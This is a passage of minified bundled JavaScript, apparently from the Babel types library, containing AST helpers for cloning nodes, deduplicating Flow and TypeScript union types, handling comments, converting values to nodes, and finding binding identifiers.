_41(X,J){A("JSX",X,J)}function E41(X,J){A("Miscellaneous",X,J)}function k41(X,J){A("TypeScript",X,J)}function b41(X,J){A("TSTypeElement",X,J)}function v41(X,J){A("TSType",X,J)}function f41(X,J){A("TSBaseType",X,J)}function x41(X,J){(0,Y7.default)("assertNumberLiteral","assertNumericLiteral"),A("NumberLiteral",X,J)}function h41(X,J){(0,Y7.default)("assertRegexLiteral","assertRegExpLiteral"),A("RegexLiteral",X,J)}function y41(X,J){(0,Y7.default)("assertRestProperty","assertRestElement"),A("RestProperty",X,J)}function g41(X,J){(0,Y7.default)("assertSpreadProperty","assertSpreadElement"),A("SpreadProperty",X,J)}function m41(X,J){(0,Y7.default)("assertModuleDeclaration","assertImportOrExportDeclaration"),A("ModuleDeclaration",X,J)}});var FU=v((jU)=>{Object.defineProperty(jU,"__esModule",{value:!0});jU.default=void 0;var c9=K9(),Lr1=jU.default=IG1;function IG1(X){switch(X){case"string":return(0,c9.stringTypeAnnotation)();case"number":return(0,c9.numberTypeAnnotation)();case"undefined":return(0,c9.voidTypeAnnotation)();case"boolean":return(0,c9.booleanTypeAnnotation)();case"function":return(0,c9.genericTypeAnnotation)((0,c9.identifier)("Function"));case"object":return(0,c9.genericTypeAnnotation)((0,c9.identifier)("Object"));case"symbol":return(0,c9.genericTypeAnnotation)((0,c9.identifier)("Symbol"));case"bigint":return(0,c9.anyTypeAnnotation)()}throw Error("Invalid typeof value: "+X)}});var AY=v((DU)=>{Object.defineProperty(DU,"__esModule",{value:!0});DU.default=AU;var W7=F0();function RU(X){return(0,W7.isIdentifier)(X)?X.name:`${X.id.name}.${RU(X.qualification)}`}function AU(X){let J=Array.from(X),Q=new Map,Y=new Map,W=new Set,G=[];for(let H=0;H<J.length;H++){let z=J[H];if(!z)continue;if(G.includes(z))continue;if((0,W7.isAnyTypeAnnotation)(z))return[z];if((0,W7.isFlowBaseAnnotation)(z)){Y.set(z.type,z);continue}if((0,W7.isUnionTypeAnnotation)(z)){if(!W.has(z.types))J.push(...z.types),W.add(z.types);continue}if((0,W7.isGenericTypeAnnotation)(z)){let $=RU(z.id);if(Q.has($)){let V=Q.get($);if(V.typeParameters){if(z.typeParameters)V.typeParameters.params.push(...z.typeParameters.params),V.typeParameters.params=AU(V.typeParameters.params)}else V=z.typeParameters}else Q.set($,z);continue}G.push(z)}for(let[,H]of Y)G.push(H);for(let[,H]of Q)G.push(H);return G}});var NU=v((wU)=>{Object.defineProperty(wU,"__esModule",{value:!0});wU.default=TG1;var PG1=K9(),SG1=AY();function TG1(X){let J=(0,SG1.default)(X);if(J.length===1)return J[0];else return(0,PG1.unionTypeAnnotation)(J)}});var PU=v((CU)=>{Object.defineProperty(CU,"__esModule",{value:!0});CU.default=IU;var r8=F0();function LU(X){return(0,r8.isIdentifier)(X)?X.name:(0,r8.isThisExpression)(X)?"this":`${X.right.name}.${LU(X.left)}`}function IU(X){let J=Array.from(X),Q=new Map,Y=new Map,W=new Set,G=[];for(let H=0;H<J.length;H++){let z=J[H];if(!z)continue;if(G.includes(z))continue;if((0,r8.isTSAnyKeyword)(z))return[z];if((0,r8.isTSBaseType)(z)){Y.set(z.type,z);continue}if((0,r8.isTSUnionType)(z)){if(!W.has(z.types))J.push(...z.types),W.add(z.types);continue}let $="typeParameters";if((0,r8.isTSTypeReference)(z)&&z[$]){let V=z[$],K=LU(z.typeName);if(Q.has(K)){let Z=Q.get(K),q=Z[$];if(q)q.params.push(...V.params),q.params=IU(q.params);else Z=V}else Q.set(K,z);continue}G.push(z)}for(let[,H]of Y)G.push(H);for(let[,H]of Q)G.push(H);return G}});var TU=v((SU)=>{Object.defineProperty(SU,"__esModule",{value:!0});SU.default=fG1;var kG1=K9(),bG1=PU(),vG1=F0();function fG1(X){let J=X.map((Y)=>{return(0,vG1.isTSTypeAnnotation)(Y)?Y.typeAnnotation:Y}),Q=(0,bG1.default)(J);if(Q.length===1)return Q[0];else return(0,kG1.tsUnionType)(Q)}});var DY=v((EU)=>{Object.defineProperty(EU,"__esModule",{value:!0});EU.buildUndefinedNode=hG1;var _U=K9();function hG1(){return(0,_U.unaryExpression)("void",(0,_U.numericLiteral)(0),!0)}});var zX=v((xU)=>{Object.defineProperty(xU,"__esModule",{value:!0});xU.default=gG1;var kU=I9(),bU=F0(),{hasOwn:$6}={hasOwn:Function.call.bind(Object.prototype.hasOwnProperty)};function vU(X,J,Q,Y){if(X&&typeof X.type==="string")return fU(X,J,Q,Y);return X}function wY(X,J,Q,Y){if(Array.isArray(X))return X.map((W)=>vU(W,J,Q,Y));return vU(X,J,Q,Y)}function gG1(X,J=!0,Q=!1){return fU(X,J,Q,new Map)}function fU(X,J=!0,Q=!1,Y){if(!X)return X;let{type:W}=X,G={type:X.type};if((0,bU.isIdentifier)(X)){if(G.name=X.name,$6(X,"optional")&&typeof X.optional==="boolean")G.optional=X.optional;if($6(X,"typeAnnotation"))G.typeAnnotation=J?wY(X.typeAnnotation,!0,Q,Y):X.typeAnnotation;if($6(X,"decorators"))G.decorators=J?wY(X.decorators,!0,Q,Y):X.decorators}else if(!$6(kU.NODE_FIELDS,W))throw Error(`Unknown node type: "${W}"`);else for(let H of Object.keys(kU.NODE_FIELDS[W]))if($6(X,H))if(J)G[H]=(0,bU.isFile)(X)&&H==="comments"?e5(X.comments,J,Q,Y):wY(X[H],!0,Q,Y);else G[H]=X[H];if($6(X,"loc"))if(Q)G.loc=null;else G.loc=X.loc;if($6(X,"leadingComments"))G.leadingComments=e5(X.leadingComments,J,Q,Y);if($6(X,"innerComments"))G.innerComments=e5(X.innerComments,J,Q,Y);if($6(X,"trailingComments"))G.trailingComments=e5(X.trailingComments,J,Q,Y);if($6(X,"extra"))G.extra=Object.assign({},X.extra);return G}function e5(X,J,Q,Y){if(!X||!J)return X;return X.map((W)=>{let G=Y.get(W);if(G)return G;let{type:H,value:z,loc:$}=W,V={type:H,value:z,loc:$};if(Q)V.loc=null;return Y.set(W,V),V})}});var yU=v((hU)=>{Object.defineProperty(hU,"__esModule",{value:!0});hU.default=cG1;var uG1=zX();function cG1(X){return(0,uG1.default)(X,!1)}});var mU=v((gU)=>{Object.defineProperty(gU,"__esModule",{value:!0});gU.default=dG1;var pG1=zX();function dG1(X){return(0,pG1.default)(X)}});var cU=v((uU)=>{Object.defineProperty(uU,"__esModule",{value:!0});uU.default=aG1;var rG1=zX();function aG1(X){return(0,rG1.default)(X,!0,!0)}});var pU=v((lU)=>{Object.defineProperty(lU,"__esModule",{value:!0});lU.default=oG1;var sG1=zX();function oG1(X){return(0,sG1.default)(X,!1,!0)}});var NY=v((dU)=>{Object.defineProperty(dU,"__esModule",{value:!0});dU.default=eG1;function eG1(X,J,Q){if(!Q||!X)return X;let Y=`${J}Comments`;if(X[Y])if(J==="leading")X[Y]=Q.concat(X[Y]);else X[Y].push(...Q);else X[Y]=Q;return X}});var rU=v((iU)=>{Object.defineProperty(iU,"__esModule",{value:!0});iU.default=QH1;var JH1=NY();function QH1(X,J,Q,Y){return(0,JH1.default)(X,J,[{type:Y?"CommentLine":"CommentBlock",value:Q}])}});var X4=v((aU)=>{Object.defineProperty(aU,"__esModule",{value:!0});aU.default=WH1;function WH1(X,J,Q){if(J&&Q)J[X]=Array.from(new Set([].concat(J[X],Q[X]).filter(Boolean)))}});var LY=v((nU)=>{Object.defineProperty(nU,"__esModule",{value:!0});nU.default=zH1;var HH1=X4();function zH1(X,J){(0,HH1.default)("innerComments",X,J)}});var IY=v((sU)=>{Object.defineProperty(sU,"__esModule",{value:!0});sU.default=KH1;var VH1=X4();function KH1(X,J){(0,VH1.default)("leadingComments",X,J)}});var CY=v((oU)=>{Object.defineProperty(oU,"__esModule",{value:!0});oU.default=qH1;var ZH1=X4();function qH1(X,J){(0,ZH1.default)("trailingComments",X,J)}});var PY=v((tU)=>{Object.defineProperty(tU,"__esModule",{value:!0});tU.default=FH1;var MH1=CY(),jH1=IY(),OH1=LY();function FH1(X,J){return(0,MH1.default)(X,J),(0,jH1.default)(X,J),(0,OH1.default)(X,J),X}});var XZ=v((eU)=>{Object.defineProperty(eU,"__esModule",{value:!0});eU.default=DH1;var AH1=l8();function DH1(X){return AH1.COMMENT_KEYS.forEach((J)=>{X[J]=null}),X}});var YZ=v((JZ)=>{Object.defineProperty(JZ,"__esModule",{value:!0});JZ.WHILE_TYPES=JZ.USERWHITESPACABLE_TYPES=JZ.UNARYLIKE_TYPES=JZ.TYPESCRIPT_TYPES=JZ.TSTYPE_TYPES=JZ.TSTYPEELEMENT_TYPES=JZ.TSENTITYNAME_TYPES=JZ.TSBASETYPE_TYPES=JZ.TERMINATORLESS_TYPES=JZ.STATEMENT_TYPES=JZ.STANDARDIZED_TYPES=JZ.SCOPABLE_TYPES=JZ.PUREISH_TYPES=JZ.PROPERTY_TYPES=JZ.PRIVATE_TYPES=JZ.PATTERN_TYPES=JZ.PATTERNLIKE_TYPES=JZ.OBJECTMEMBER_TYPES=JZ.MODULESPECIFIER_TYPES=JZ.MODULEDECLARATION_TYPES=JZ.MISCELLANEOUS_TYPES=JZ.METHOD_TYPES=JZ.LVAL_TYPES=JZ.LOOP_TYPES=JZ.LITERAL_TYPES=JZ.JSX_TYPES=JZ.IMPORTOREXPORTDECLARATION_TYPES=JZ.IMMUTABLE_TYPES=JZ.FUNCTION_TYPES=JZ.FUNCTIONPARENT_TYPES=JZ.FUNCTIONPARAMETER_TYPES=JZ.FOR_TYPES=JZ.FORXSTATEMENT_TYPES=JZ.FLOW_TYPES=JZ.FLOWTYPE_TYPES=JZ.FLOWPREDICATE_TYPES=JZ.FLOWDECLARATION_TYPES=JZ.FLOWBASEANNOTATION_TYPES=JZ.EXPRESSION_TYPES=JZ.EXPRESSIONWRAPPER_TYPES=JZ.EXPORTDECLARATION_TYPES=JZ.ENUMMEMBER_TYPES=JZ.ENUMBODY_TYPES=JZ.DECLARATION_TYPES=JZ.CONDITIONAL_TYPES=JZ.COMPLETIONSTATEMENT_TYPES=JZ.CLASS_TYPES=JZ.BLOCK_TYPES=JZ.BLOCKPARENT_TYPES=JZ.BINARY_TYPES=JZ.ACCESSOR_TYPES=void 0;var S1=I9(),pr1=JZ.STANDARDIZED_TYPES=S1.FLIPPED_ALIAS_KEYS.Standardized,dr1=JZ.EXPRESSION_TYPES=S1.FLIPPED_ALIAS_KEYS.Expression,ir1=JZ.BINARY_TYPES=S1.FLIPPED_ALIAS_KEYS.Binary,rr1=JZ.SCOPABLE_TYPES=S1.FLIPPED_ALIAS_KEYS.Scopable,ar1=JZ.BLOCKPARENT_TYPES=S1.FLIPPED_ALIAS_KEYS.BlockParent,nr1=JZ.BLOCK_TYPES=S1.FLIPPED_ALIAS_KEYS.Block,sr1=JZ.STATEMENT_TYPES=S1.FLIPPED_ALIAS_KEYS.Statement,or1=JZ.TERMINATORLESS_TYPES=S1.FLIPPED_ALIAS_KEYS.Terminatorless,tr1=JZ.COMPLETIONSTATEMENT_TYPES=S1.FLIPPED_ALIAS_KEYS.CompletionStatement,er1=JZ.CONDITIONAL_TYPES=S1.FLIPPED_ALIAS_KEYS.Conditional,Xa1=JZ.LOOP_TYPES=S1.FLIPPED_ALIAS_KEYS.Loop,Ja1=JZ.WHILE_TYPES=S1.FLIPPED_ALIAS_KEYS.While,Qa1=JZ.EXPRESSIONWRAPPER_TYPES=S1.FLIPPED_ALIAS_KEYS.ExpressionWrapper,Ya1=JZ.FOR_TYPES=S1.FLIPPED_ALIAS_KEYS.For,Wa1=JZ.FORXSTATEMENT_TYPES=S1.FLIPPED_ALIAS_KEYS.ForXStatement,Ga1=JZ.FUNCTION_TYPES=S1.FLIPPED_ALIAS_KEYS.Function,Ha1=JZ.FUNCTIONPARENT_TYPES=S1.FLIPPED_ALIAS_KEYS.FunctionParent,za1=JZ.PUREISH_TYPES=S1.FLIPPED_ALIAS_KEYS.Pureish,$a1=JZ.DECLARATION_TYPES=S1.FLIPPED_ALIAS_KEYS.Declaration,Va1=JZ.FUNCTIONPARAMETER_TYPES=S1.FLIPPED_ALIAS_KEYS.FunctionParameter,Ka1=JZ.PATTERNLIKE_TYPES=S1.FLIPPED_ALIAS_KEYS.PatternLike,Ua1=JZ.LVAL_TYPES=S1.FLIPPED_ALIAS_KEYS.LVal,Za1=JZ.TSENTITYNAME_TYPES=S1.FLIPPED_ALIAS_KEYS.TSEntityName,qa1=JZ.LITERAL_TYPES=S1.FLIPPED_ALIAS_KEYS.Literal,Ba1=JZ.IMMUTABLE_TYPES=S1.FLIPPED_ALIAS_KEYS.Immutable,Ma1=JZ.USERWHITESPACABLE_TYPES=S1.FLIPPED_ALIAS_KEYS.UserWhitespacable,ja1=JZ.METHOD_TYPES=S1.FLIPPED_ALIAS_KEYS.Method,Oa1=JZ.OBJECTMEMBER_TYPES=S1.FLIPPED_ALIAS_KEYS.ObjectMember,Fa1=JZ.PROPERTY_TYPES=S1.FLIPPED_ALIAS_KEYS.Property,Ra1=JZ.UNARYLIKE_TYPES=S1.FLIPPED_ALIAS_KEYS.UnaryLike,Aa1=JZ.PATTERN_TYPES=S1.FLIPPED_ALIAS_KEYS.Pattern,Da1=JZ.CLASS_TYPES=S1.FLIPPED_ALIAS_KEYS.Class,NH1=JZ.IMPORTOREXPORTDECLARATION_TYPES=S1.FLIPPED_ALIAS_KEYS.ImportOrExportDeclaration,wa1=JZ.EXPORTDECLARATION_TYPES=S1.FLIPPED_ALIAS_KEYS.ExportDeclaration,Na1=JZ.MODULESPECIFIER_TYPES=S1.FLIPPED_ALIAS_KEYS.ModuleSpecifier,La1=JZ.ACCESSOR_TYPES=S1.FLIPPED_ALIAS_KEYS.Accessor,Ia1=JZ.PRIVATE_TYPES=S1.FLIPPED_ALIAS_KEYS.Private,Ca1=JZ.FLOW_TYPES=S1.FLIPPED_ALIAS_KEYS.Flow,Pa1=JZ.FLOWTYPE_TYPES=S1.FLIPPED_ALIAS_KEYS.FlowType,Sa1=JZ.FLOWBASEANNOTATION_TYPES=S1.FLIPPED_ALIAS_KEYS.FlowBaseAnnotation,Ta1=JZ.FLOWDECLARATION_TYPES=S1.FLIPPED_ALIAS_KEYS.FlowDeclaration,_a1=JZ.FLOWPREDICATE_TYPES=S1.FLIPPED_ALIAS_KEYS.FlowPredicate,Ea1=JZ.ENUMBODY_TYPES=S1.FLIPPED_ALIAS_KEYS.EnumBody,ka1=JZ.ENUMMEMBER_TYPES=S1.FLIPPED_ALIAS_KEYS.EnumMember,ba1=JZ.JSX_TYPES=S1.FLIPPED_ALIAS_KEYS.JSX,va1=JZ.MISCELLANEOUS_TYPES=S1.FLIPPED_ALIAS_KEYS.Miscellaneous,fa1=JZ.TYPESCRIPT_TYPES=S1.FLIPPED_ALIAS_KEYS.TypeScript,xa1=JZ.TSTYPEELEMENT_TYPES=S1.FLIPPED_ALIAS_KEYS.TSTypeElement,ha1=JZ.TSTYPE_TYPES=S1.FLIPPED_ALIAS_KEYS.TSType,ya1=JZ.TSBASETYPE_TYPES=S1.FLIPPED_ALIAS_KEYS.TSBaseType,ga1=JZ.MODULEDECLARATION_TYPES=NH1});var TY=v((WZ)=>{Object.defineProperty(WZ,"__esModule",{value:!0});WZ.default=Az1;var J4=F0(),SY=K9();function Az1(X,J){if((0,J4.isBlockStatement)(X))return X;let Q=[];if((0,J4.isEmptyStatement)(X))Q=[];else{if(!(0,J4.isStatement)(X))if((0,J4.isFunction)(J))X=(0,SY.returnStatement)(X);else X=(0,SY.expressionStatement)(X);Q=[X]}return(0,SY.blockStatement)(Q)}});var HZ=v((GZ)=>{Object.defineProperty(GZ,"__esModule",{value:!0});GZ.default=Nz1;var wz1=TY();function Nz1(X,J="body"){let Q=(0,wz1.default)(X[J],X);return X[J]=Q,Q}});var _Y=v((zZ)=>{Object.defineProperty(zZ,"__esModule",{value:!0});zZ.default=Pz1;var Iz1=c8(),Cz1=tJ();function Pz1(X){X=X+"";let J="";for(let Q of X)J+=(0,Cz1.isIdentifierChar)(Q.codePointAt(0))?Q:"-";if(J=J.replace(/^[-0-9]+/,""),J=J.replace(/[-\s]+(.)?/g,function(Q,Y){return Y?Y.toUpperCase():""}),!(0,Iz1.default)(J))J=`_${J}`;return J||"_"}});var VZ=v(($Z)=>{Object.defineProperty($Z,"__esModule",{value:!0});$Z.default=_z1;var Tz1=_Y();function _z1(X){if(X=(0,Tz1.default)(X),X==="eval"||X==="arguments")X="_"+X;return X}});var UZ=v((KZ)=>{Object.defineProperty(KZ,"__esModule",{value:!0});KZ.default=vz1;var kz1=F0(),bz1=K9();function vz1(X,J=X.key||X.property){if(!X.computed&&(0,kz1.isIdentifier)(J))J=(0,bz1.stringLiteral)(J.name);return J}});var BZ=v((ZZ)=>{Object.defineProperty(ZZ,"__esModule",{value:!0});ZZ.default=void 0;var G7=F0(),ia1=ZZ.default=xz1;function xz1(X){if((0,G7.isExpressionStatement)(X))X=X.expression;if((0,G7.isExpression)(X))return X;if((0,G7.isClass)(X))X.type="ClassExpression",X.abstract=!1;else if((0,G7.isFunction)(X))X.type="FunctionExpression";if(!(0,G7.isExpression)(X))throw Error(`cannot turn ${X.type} to an expression`);return X}});var EY=v((OZ)=>{Object.defineProperty(OZ,"__esModule",{value:!0});OZ.default=H7;var hz1=I9(),MZ=Symbol(),jZ=Symbol();function H7(X,J,Q){if(!X)return!1;let Y=hz1.VISITOR_KEYS[X.type];if(!Y)return!1;Q=Q||{};let W=J(X,Q);if(W!==void 0)switch(W){case MZ:return!1;case jZ:return!0}for(let G of Y){let H=X[G];if(!H)continue;if(Array.isArray(H)){for(let z of H)if(H7(z,J,Q))return!0}else if(H7(H,J,Q))return!0}return!1}H7.skip=MZ;H7.stop=jZ});var kY=v((RZ)=>{Object.defineProperty(RZ,"__esModule",{value:!0});RZ.default=uz1;var gz1=l8(),FZ=["tokens","start","end","loc","raw","rawValue"],mz1=[...gz1.COMMENT_KEYS,"comments",...FZ];function uz1(X,J={}){let Q=J.preserveComments?FZ:mz1;for(let W of Q)if(X[W]!=null)X[W]=void 0;for(let W of Object.keys(X))if(W[0]==="_"&&X[W]!=null)X[W]=void 0;let Y=Object.getOwnPropertySymbols(X);for(let W of Y)X[W]=null}});var bY=v((AZ)=>{Object.defineProperty(AZ,"__esModule",{value:!0});AZ.default=dz1;var lz1=EY(),pz1=kY();function dz1(X,J){return(0,lz1.default)(X,pz1.default,J),X}});var NZ=v((wZ)=>{Object.defineProperty(wZ,"__esModule",{value:!0});wZ.default=fX;var DZ=F0(),rz1=zX(),az1=bY();function fX(X,J=X.key){let Q;if(X.kind==="method")return fX.increment()+"";else if((0,DZ.isIdentifier)(J))Q=J.name;else if((0,DZ.isStringLiteral)(J))Q=JSON.stringify(J.value);else Q=JSON.stringify((0,az1.default)((0,rz1.default)(J)));if(X.computed)Q=`[${Q}]`;if(X.static)Q=`static:${Q}`;return Q}fX.uid=0;fX.increment=function(){if(fX.uid>=Number.MAX_SAFE_INTEGER)return fX.uid=0;else return fX.uid++}});var CZ=v((LZ)=>{Object.defineProperty(LZ,"__esModule",{value:!0});LZ.default=void 0;var Q4=F0(),sz1=K9(),ta1=LZ.default=oz1;function oz1(X,J){if((0,Q4.isStatement)(X))return X;let Q=!1,Y;if((0,Q4.isClass)(X))Q=!0,Y="ClassDeclaration";else if((0,Q4.isFunction)(X))Q=!0,Y="FunctionDeclaration";else if((0,Q4.isAssignmentExpression)(X))return(0,sz1.expressionStatement)(X);if(Q&&!X.id)Y=!1;if(!Y)if(J)return!1;else throw Error(`cannot turn ${X.type} to a statement`);return X.type=Y,X}});var TZ=v((PZ)=>{Object.defineProperty(PZ,"__esModule",{value:!0});PZ.default=void 0;var tz1=c8(),I0=K9(),Xn1=PZ.default=vY,ez1=Function.call.bind(Object.prototype.toString);function X$1(X){return ez1(X)==="[object RegExp]"}function J$1(X){if(typeof X!=="object"||X===null||Object.prototype.toString.call(X)!=="[object Object]")return!1;let J=Object.getPrototypeOf(X);return J===null||Object.getPrototypeOf(J)===null}function vY(X){if(X===void 0)return(0,I0.identifier)("undefined");if(X===!0||X===!1)return(0,I0.booleanLiteral)(X);if(X===null)return(0,I0.nullLiteral)();if(typeof X==="string")return(0,I0.stringLiteral)(X);if(typeof X==="number"){let J;if(Number.isFinite(X))J=(0,I0.numericLiteral)(Math.abs(X));else{let Q;if(Number.isNaN(X))Q=(0,I0.numericLiteral)(0);else Q=(0,I0.numericLiteral)(1);J=(0,I0.binaryExpression)("/",Q,(0,I0.numericLiteral)(0))}if(X<0||Object.is(X,-0))J=(0,I0.unaryExpression)("-",J);return J}if(typeof X==="bigint")if(X<0)return(0,I0.unaryExpression)("-",(0,I0.bigIntLiteral)(-X));else return(0,I0.bigIntLiteral)(X);if(X$1(X)){let J=X.source,Q=/\/([a-z]*)$/.exec(X.toString())[1];return(0,I0.regExpLiteral)(J,Q)}if(Array.isArray(X))return(0,I0.arrayExpression)(X.map(vY));if(J$1(X)){let J=[];for(let Q of Object.keys(X)){let Y,W=!1;if((0,tz1.default)(Q))if(Q==="__proto__")W=!0,Y=(0,I0.stringLiteral)(Q);else Y=(0,I0.identifier)(Q);else Y=(0,I0.stringLiteral)(Q);J.push((0,I0.objectProperty)(Y,vY(X[Q]),W))}return(0,I0.objectExpression)(J)}throw Error("don't know how to turn this value into a node")}});var EZ=v((_Z)=>{Object.defineProperty(_Z,"__esModule",{value:!0});_Z.default=Y$1;var Q$1=K9();function Y$1(X,J,Q=!1){return X.object=(0,Q$1.memberExpression)(X.object,X.property,X.computed),X.property=J,X.computed=!!Q,X}});var vZ=v((bZ)=>{Object.defineProperty(bZ,"__esModule",{value:!0});bZ.default=H$1;var kZ=l8(),G$1=PY();function H$1(X,J){if(!X||!J)return X;for(let Q of kZ.INHERIT_KEYS.optional)if(X[Q]==null)X[Q]=J[Q];for(let Q of Object.keys(J))if(Q[0]==="_"&&Q!=="__clone")X[Q]=J[Q];for(let Q of kZ.INHERIT_KEYS.force)X[Q]=J[Q];return(0,G$1.default)(X,J),X}});var xZ=v((fZ)=>{Object.defineProperty(fZ,"__esModule",{value:!0});fZ.default=K$1;var $$1=K9(),V$1=y1();function K$1(X,J){if((0,V$1.isSuper)(X.object))throw Error("Cannot prepend node to super property access (`super.foo`).");return X.object=(0,$$1.memberExpression)(J,X.object),X}});var yZ=v((hZ)=>{Object.defineProperty(hZ,"__esModule",{value:!0});hZ.default=Z$1;function Z$1(X){let J=[].concat(X),Q=Object.create(null);while(J.length){let Y=J.pop();if(!Y)continue;switch(Y.type){case"ArrayPattern":J.push(...Y.elements);break;case"AssignmentExpression":case"AssignmentPattern":case"ForInStatement":case"ForOfStatement":J.push(Y.left);break;case"ObjectPattern":J.push(...Y.properties);break;case"ObjectProperty":J.push(Y.value);break;case"RestElement":case"UpdateExpression":J.push(Y.argument);break;case"UnaryExpression":if(Y.operator==="delete")J.push(Y.argument);break;case"Identifier":Q[Y.name]=Y;break;default:break}}return Q}});var z7=v((gZ)=>{Object.defineProperty(gZ,"__esModule",{value:!0});gZ.default=fY;var k6=F0();function fY(X,J,Q,Y){let W=[].concat(X),G=Object.create(null);while(W.length){let H=W.shift();if(!H)continue;if(Y&&((0,k6.isAssignmentExpression)(H)||(0,k6.isUnaryExpression)(H)||(0,k6.isUpdateExpression)(H)))continue;if((0,k6.isIdentifier)(H)){if(J)(G[H.name]=G[H.name]||[]).push(H);else G[H.name]=H;continue}if((0,k6.isExportDeclaration)(H)&&!(0,k6.isExportAllDeclaration)(H)){if((0,k6.isDeclaration)(H.declaration))W.push(H.declaration);continue}if(Q){if((0,k6.isFunctionDeclaration)(H)){W.push(H.id);continue}if((0,k6.isFunctionExpression)(H))continue}let z=fY.keys[H.type];if(z)for(let $=0;$<z.length;$++){let V=z[$],K=H[V];if(K)if(Array.isArray(K))W.push(...K);else W.push(K)}}return G}var B$1={DeclareClass:["id"],DeclareFunction:["id"],DeclareModule:["id"],DeclareVariable:["id"],DeclareInterface:["id"],DeclareTypeAlias:["id"],DeclareOpaqueType:["id"],InterfaceDeclaration:["id"],TypeAlias:["id"],OpaqueType:["id"],CatchClause:["param"],LabeledStatement:["label"],UnaryExpression:["argument"],AssignmentExpression:["left"],ImportSpecifier:["local"],ImportNamespaceSpecifier:["local"],ImportDefaultSpecifier:["local"],ImportDeclaration:["specifiers"],TSImportEqualsDeclaration:["id"],ExportSpecifier:["exported"],ExportNamespaceSpecifier:["exported"],ExportDefaultSpecifier:["exported"],FunctionDeclaration:["id","params"],FunctionExpression:["id","params"],ArrowFunctionExpression:["params"],ObjectMethod:["params"],ClassMethod:["params"],ClassPrivateMethod:["params"],ForInStatement:["left"],ForOfStatement:["left"],ClassDeclaration:["id"],ClassExpression:["id"],RestElement:["argument"],UpdateExpression:["argument"],ObjectProperty:["value"],AssignmentPattern:["left"],ArrayPattern:["elements"],ObjectPattern:["properties"],VariableDeclaration:["declarations"],VariableDeclarator:["id"]};fY.keys=B$1});var cZ=v((mZ)=>{Object.defineProperty(mZ,"__esModule",{value:!0});mZ.default=void 0;var j$1=z7(),zn1=mZ.default=O$1;function O$1(X,J){return(0,j$1.default)(X,J,!0)}});var dZ=v((pZ)=>{Object.defineProperty(pZ,"__esModule",{value:!0});pZ.default=R$1;var C9=F0();function F$1(X){if((0,C9.isNullLiteral)(X))return"null";if((0,C9.isRegExpLiteral)(X))return`/${X.pattern}/${X.flags}`;if((0,C9.isTemplateLiteral)(X))return X.quasis.map((J)=>J.value.raw).join("");if(X.value!==void 0)return String(X.value);return null}function lZ(X){if(!X.computed||(0,C9.isLiteral)(X.key))return X.key}function R$1(X,J){if("id"in X&&X.id)return{name:X.id.name,originalNode:X.id};let Q="",Y;if((0,C9.isObjectProperty)(J,{value:X}))Y=lZ(J);else if((0,C9.isObjectMethod)(X)||(0,C9.isClassMethod)(X)){if(Y=lZ(X),X.kind==="get")Q="get ";else if(X.kind==="set")Q="set "}else if((0,C9.isVariableDeclarator)(J,{init:X}))Y=J.id;else if((0,C9.isAssignmentExpression)(J,{operator:"=",right:X}))Y=J.left;if(!Y)return null;let W=(0,C9.isLiteral)(Y)?F$1(Y):(0,C9.isIdentifier)(Y)?Y.name:(0,C9.isPrivateName)(Y)?Y.id.name:null;if(W==null)return null;return{name:Q+W,originalNode:Y}}});var rZ=v((iZ)=>{Object.defineProperty(iZ,"__esModule",{value:!0});iZ.default=w$1;var D$1=I9();function w$1(X,J,Q){if(typeof J==="function")J={enter:J};let{enter:Y,exit:W}=J;xY(X,Y,W,Q,[])}function xY(X,J,Q,Y,W){let G=D$1.VISITOR_KEYS[X.type];if(!G)return;if(J)J(X,W,Y);for(let H of G){let z=X[H];if(Array.isArray(z))for(let $=0;$<z.length;$++){let V=z[$];if(!V)continue;W.push({node:X,key:H,index:$}),xY(V,J,Q,Y,W),W.pop()}else if(z)W.push({node:X,key:H}),xY(z,J,Q,Y,W),W.pop()}if(Q)Q(X,W,Y)}});var nZ=v((aZ)=>{Object.defineProperty(aZ,"__esModule",{value:!0});aZ.default=I$1;var L$1=z7();function I$1(X,J,Q){if(Q&&X.type==="Identifier"&&J.type==="ObjectProperty"&&Q.type==="ObjectExpression")return!1;let Y=L$1.default.keys[J.type];if(Y)for(let W=0;W<Y.length;W++){let G=Y[W],H=J[G];if(Array.isArray(H)){if(H.includes(X))return!0}else if(H===X)return!0}return!1}});var yY=v((sZ)=>{Object.defineProperty(sZ,"__esModule",{value:!0});sZ.default=S$1;var P$1=F0();hY=Symbol.for("var used to be block scoped");var hY;function S$1(X){return(0,P$1.isVariableDeclaration)(X)&&(X.kind!=="var"||X[hY])}});var eZ=v((tZ)=>{Object.defineProperty(tZ,"__esModule",{value:!0});tZ.default=E$1;var oZ=F0(),_$1=yY();function E$1(X){return(0,oZ.isFunctionDeclaration)(X)||(0,oZ.isClassDeclaration)(X)||(0,_$1.default)(X)}});var Jq=v((Xq)=>{Object.defineProperty(Xq,"__esModule",{value:!0});Xq.default=f$1;var b$1=p5(),v$1=F0();function f$1(X){if((0,b$1.default)(X.type,"Immutable"))return!0;if((0,v$1.isIdentifier)(X))if(X.name==="undefined")return!0;else return!1;return!1}});var Wq=v((Yq)=>{Object.defineProperty(Yq,"__esModule",{value:!0});Yq.default=gY;var Qq=I9();function gY(X,J){if(typeof X!=="object"||typeof J!=="object"||X==null||J==null)return X===J;if(X.type!==J.type)return!1;let Q=Object.keys(Qq.NODE_FIELDS[X.type]||X.type),Y=Qq.VISITOR_KEYS[X.type];for(let W of Q){let G=X[W],H=J[W];if(typeof G!==typeof H)return!1;if(G==null&&H==null)continue;else if(G==null||H==null)return!1;if(Array.isArray(G)){if(!Array.isArray(H))return!1;if(G.length!==H.length)return!1;for(let z=0;z<G.length;z++)if(!gY(G[z],H[z]))return!1;continue}if(typeof G==="object"&&!(Y!=null&&Y.includes(W))){for(let z of Object.keys(G))if(G[z]!==H[z])return!1;continue}if(!gY(G,H))return!1}return!0}});var Hq=v((Gq)=>{Object.defineProperty(Gq,"__esModule",{value:!0});Gq.default=y$1;function y$1(X,J,Q){switch(J.type){case"MemberExpression":case"OptionalMemberExpression":if(J.property===X)return!!J.computed;return J.object===X;case"JSXMemberExpression":return J.object===X;case"VariableDeclarator":return J.init===X;case"ArrowFunctionExpression":return J.body===X;case"PrivateName":return!1;case"ClassMethod":case"ClassPrivateMethod":case"ObjectMethod":if(J.key===X)return!!J.computed;return!1;case"ObjectProperty":if(J.key===X)return!!J.computed;return!Q||Q.type!=="ObjectPattern";case"ClassProperty":case"ClassAccessorProperty":if(J.key===X)return!!J.computed;return!0;case"ClassPrivateProperty":return J.key!==X;case"ClassDeclaration":case"ClassExpression":return J.superClass===X;case"AssignmentExpression":return J.right===X;case"AssignmentPattern":return 